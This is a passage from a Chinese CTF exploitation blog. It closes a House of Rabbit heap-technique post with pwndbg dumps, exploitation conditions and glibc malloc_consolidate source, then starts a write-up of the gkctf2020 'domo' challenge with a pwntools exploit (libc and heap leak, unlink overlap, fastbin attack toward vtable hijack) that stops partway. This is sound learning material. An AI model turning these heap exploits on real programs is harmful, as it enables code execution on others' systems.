<p>chunk3=malloc(5000) 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55555555b000</span> —▸ <span class="number">0x55555555b060</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"><span class="comment">// 0x55555555b000: chunk1</span></span><br><span class="line"><span class="comment">// 0x55555555b060: chunk2 data(fake chunk1)</span></span><br></pre></td></tr></table></figure>
<p>强行令 chunk1-&gt;FD 指向 chunk2 data(fake chunk1)</p>
<p>chunk3=malloc(5000) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">    <span class="comment">// fake chunk1-&gt;size:0x30</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x55555555b060</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x55555555b060</span> </span><br><span class="line">    <span class="comment">// chunk1-&gt;size:0x50</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55555555b000</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) ◂— <span class="number">0x55555555b000</span></span><br></pre></td></tr></table></figure>
<p>查看最终的 heap 排列：（“fake chunk1”将会作为“chunk4”被申请）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555555b000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555b000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555b008</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555b010</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555b018</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555b020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x55555555b040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x55555555b048</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x55555555b050</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x55555555b058</span> ◂— <span class="number">0x110</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x55555555b060</span> —▸ <span class="number">0x55555555600b</span> ◂— <span class="number">0x6300326b6e756863</span> <span class="comment">/* &#x27;chunk2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x55555555b068</span> ◂— <span class="number">0x31</span> <span class="comment">/* fake chunk1-&gt;size */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│ rax <span class="number">0x55555555b070</span> —▸ <span class="number">0x555555556019</span> ◂— <span class="number">0x100346b6e756863</span> <span class="comment">/* &#x27;chunk4&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x55555555b078</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x55555555c4f0</span> ◂— ...</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55555555b080</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x55555555b088</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x55555555b090</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x55555555b098</span> ◂— <span class="number">0x21</span> <span class="comment">/* fake chunk2-&gt;size */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55555555b0a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55555555b0b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* fake chunk3-&gt;size */</span></span><br><span class="line">    ..........................</span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x55555555b168</span> ◂— <span class="number">0x1391</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x55555555b170</span> —▸ <span class="number">0x555555556012</span> ◂— <span class="number">0x6300336b6e756863</span> <span class="comment">/* &#x27;chunk3&#x27; */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x55555555b178</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>chunk2 和 chunk4（fake chunk1）明显重叠了</p>
<p><strong>利用条件：</strong></p>
<p>House Of Rabbit 功能很强大，但条件过多并且有替代选项：</p>
<ul>
<li>修改fastbin chunk的大小（感觉和unlink条件差不多，效果也差不多）<ul>
<li>堆溢出（有时off-by-one也利用），可以覆盖 nextchunk-&gt;size</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
<li>修改FD指针（这种情况不用考虑，因为可以打 Double free，除非特殊情况）<ul>
<li>有修改模块，并且有UAF（可以修改 free chunk）</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
</ul>
<h2 id="版本对-House-Of-Rabbit-的影响"><a href="#版本对-House-Of-Rabbit-的影响" class="headerlink" title="版本对 House Of Rabbit 的影响"></a>版本对 House Of Rabbit 的影响</h2><p>经测试：libc-2.23 ~ libc-2.31 都可以打通</p>
<p>最后挂一下 fastbin consolidate 的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">	  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_inuse_chunk(av, p);</span><br><span class="line">	nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	size = chunksize (p);</span><br><span class="line">	nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize;</span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">	  unlink(av, p, bck, fwd);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	    size += nextsize;</span><br><span class="line">	    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	  &#125; <span class="keyword">else</span></span><br><span class="line">	    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	  unsorted_bin-&gt;fd = p;</span><br><span class="line">	  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">	    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  p-&gt;bk = unsorted_bin;</span><br><span class="line">	  p-&gt;fd = first_unsorted;</span><br><span class="line">	  set_foot(p, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  size += nextsize;</span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  av-&gt;top = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​        // 反正我没有看出来哪里会导致 consolidate 报错，以后慢慢看把</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">Unlink攻击+fastbin attack+vtable劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-11 23:44:28" itemprop="dateCreated datePublished" datetime="2022-03-11T23:44:28+08:00">2022-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-17 00:15:06" itemprop="dateModified" datetime="2022-03-17T00:15:06+08:00">2022-03-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>gkctf2020 domo 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to GKCTF</span><br><span class="line"><span class="number">1</span>: Add a user</span><br><span class="line"><span class="number">2</span>: Delete a user</span><br><span class="line"><span class="number">3</span>: Show a user</span><br><span class="line"><span class="number">4</span>: Edit a user</span><br><span class="line"><span class="number">5</span>: Exit</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">domo: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=b8ef84fe110e5098832857f8a42e28fb72b4ff26, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/domo&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>程序是给了 libc.so ，可以查看版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/tool/LibcSearcher/libc-database] git:(master) ./find __libc_start_main <span class="number">740</span></span><br><span class="line">ubuntu-glibc (libc6_2<span class="number">.23</span><span class="number">-0u</span>buntu3_amd64)</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size &gt;= <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">288</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_QWORD *)&amp;chunk_list + index) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;chunk_list + index), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  *(_BYTE *)(*((_QWORD *)&amp;chunk_list + index) + size) = <span class="number">0</span>;<span class="comment">// off-by-one</span></span><br><span class="line">  ++chunk_num[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经典 off-by-one </p>
<p><strong>入侵思路</strong></p>
<p>程序ban了 hook，开了 Full RELRO，修改模块又没法正常使用（其实到这里的时候，我唯一想到的制胜手段就是 leak  Environ 获取栈地址，然后WAA返回地址进行 ret 劫持）</p>
<p>我自己尝试完成本题目时遇到了不小的麻烦，利用 unsortedbin 泄露了 libc_base，构造 fastbin 泄露了 head_addr ，但是我的构造方式很紊乱，导致之后的 unlink 完全没办法进行，所以我还是学习一下大佬的 exp 把：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;./domo&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_del</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_edit</span>(<span class="params">addr,num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;num:&#x27;</span>,num)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">cmd_add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 0(核心)</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">offset = <span class="number">0x7ffff7bcdb78</span> - <span class="number">0x7ffff7bcdb0a</span></span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(cmd_show(<span class="number">2</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + offset</span><br><span class="line">offset = <span class="number">0x7f3d7a680b78</span> - <span class="number">0x7f3d7a2bc000</span></span><br><span class="line">libc.address = main_arena - offset</span><br><span class="line">success(<span class="string">&#x27;main_arena &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_del(<span class="number">4</span>)</span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">heap_addr = u64(cmd_show(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10a</span> + <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">cmd_del(<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x40</span>,flat(<span class="number">0</span>,<span class="number">0xb1</span>,heap_addr+<span class="number">0x18</span>,heap_addr+<span class="number">0x20</span>,heap_addr+<span class="number">0x10</span>))</span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_add(<span class="number">0x68</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>,<span class="number">0xb0</span>))</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins attack</span></span><br><span class="line">_IO_file_jumps = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">_IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">one_gadgets =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">fake_target = _IO_2_1_stdin_ + <span class="number">160</span> - <span class="number">0x3</span></span><br><span class="line">cmd_add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># index 2</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;BBBBBBBB&#x27;</span>) <span 